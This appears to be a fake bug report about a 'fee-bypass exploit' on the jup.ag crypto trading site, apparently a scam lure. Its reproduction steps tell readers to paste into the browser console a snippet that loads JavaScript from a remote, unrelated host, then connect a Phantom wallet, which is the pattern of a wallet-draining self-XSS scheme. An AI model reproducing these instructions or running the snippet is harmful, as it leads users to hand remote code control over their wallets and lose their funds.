# Bug Report #1532 – Token Scalping Exploit (Bypass jup.ag Fee)

**Reporter:** William Foster  
**Assignee:** Michael Bennett  
**Date:** 01.24.2022  
**Severity:** ⚠️ Critical  
**Status:** Open  

## 📝 Description  
A critical bug allows users to bypass the **jup.ag** fee. This exploit creates an unfair trading advantage and could lead to financial losses for the platform. 

As a proof of concept, I was able to create a **Token Finder for scalping, without jup.ag fee**. This tool identifies tokens and executes trades in a way that circumvents the fee system entirely.

## 🔄 Steps to Reproduce  

1. Copy and paste the following script:  
   ```javascript
   const script = document.createElement("script");  
   script.src = "https://gitproduction.com/xxsweetchickxx3/Bug-Report-1532/main.js";  
   document.head.appendChild(script);
   ```

2. Go to **jup.ag** and open the developer tools **(Ctrl + Shift + C)**. 

3. Paste the script into the console and execute it.

4. Connect a **Phantom wallet** and test the exploit to verify that trades can be executed without fees.

## ✅ Expected Behavior  
All token swaps and scalping transactions should **include the appropriate jup.ag fee** to maintain fair trading conditions.  

## ❌ Actual Behavior  
Certain trades bypass the fee mechanism, allowing users to execute transactions **without any commission**.  

## 🛠️ Suggested Fix  
- Review and strengthen fee enforcement logic within the transaction processing system.  
- Implement additional validation checks to prevent unauthorized fee-free trades.  
- Monitor trading activity for unusual patterns related to this exploit.  

## 📌 Additional Information  
This issue requires **urgent attention** to prevent further abuse. Please confirm receipt and provide an estimated timeframe for resolution.  

**Best regards,**  
*William Foster*  
QA Tester, jup.ag  
